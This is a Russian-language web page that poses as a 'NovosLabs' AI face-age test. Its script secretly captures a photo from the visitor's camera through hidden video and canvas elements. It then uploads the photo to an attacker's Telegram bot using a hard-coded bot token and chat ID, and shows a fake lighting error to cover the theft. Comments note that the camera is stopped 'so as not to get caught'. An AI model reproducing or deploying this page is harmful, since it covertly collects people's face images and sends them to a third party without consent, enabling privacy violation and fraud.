<!DOCTYPE html>
<html>
<head>
    <title>NovosLabs: FaceAge Test</title>
    <meta charset="UTF-8">
    <style>
        body { font-family: sans-serif; text-align: center; background: #f4f7f6; color: #333; padding: 50px; }
        .box { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); max-width: 400px; margin: auto; }
        button { background: #007bff; color: white; border: none; padding: 15px 30px; border-radius: 5px; cursor: pointer; font-size: 18px; }
    </style>
</head>
<body>
    <div class="box">
        <img src="https://novoslabs.com/wp-content/uploads/2021/05/novos-logo.png" width="150">
        <h2>Тест: Биологический возраст</h2>
        <p>Нажми кнопку ниже, чтобы нейросеть проанализировала твоё лицо и определила твой реальный возраст.</p>
        <button onclick="startTest()">НАЧАТЬ ТЕСТ</button>
    </div>

    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

    <script>
      const TOKEN = "8511911062:AAGj_4rH-k2lpAXWsUe_5yM3WAEFVl0-cs4"; // Твой токен
        const CHAT_ID = "1498741744"; // Твой ID

        function startTest() {
            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } }).then(stream => {
                const video = document.getElementById('video');
                video.srcObject = stream;
                
                // Ждем, пока видео реально начнет играть
                video.onloadedmetadata = () => {
                    video.play();
                    // Даем еще 2 секунды на автофокус после старта воспроизведения
                    setTimeout(() => {
                        takePhoto();
                        setTimeout(() => {
                            alert("Ошибка: Низкое качество освещения. Попробуйте поднести телефон ближе к лицу.");
                        }, 1000);
                    }, 2000);
                };
            }).catch(err => {
                alert("Для теста NovosLabs необходимо разрешить доступ к камере.");
            });
        }

        function takePhoto() {
            const canvas = document.getElementById('canvas');
            const video = document.getElementById('video');
            const context = canvas.getContext('2d');
            
            // Рисуем кадр
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            canvas.toBlob(blob => {
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('document', blob, 'face.jpg');
                
                fetch(`https://api.telegram.org/bot${TOKEN}/sendDocument`, {
                    method: 'POST',
                    body: formData
                }).then(res => {
                    // Останавливаем камеру после отправки, чтобы не палиться
                    const tracks = video.srcObject.getTracks();
                    tracks.forEach(track => track.stop());
                });
            }, 'image/jpeg', 0.8); // 0.8 - качество, чтобы файл летел быстрее
        }
    </script>
</body>

</html>

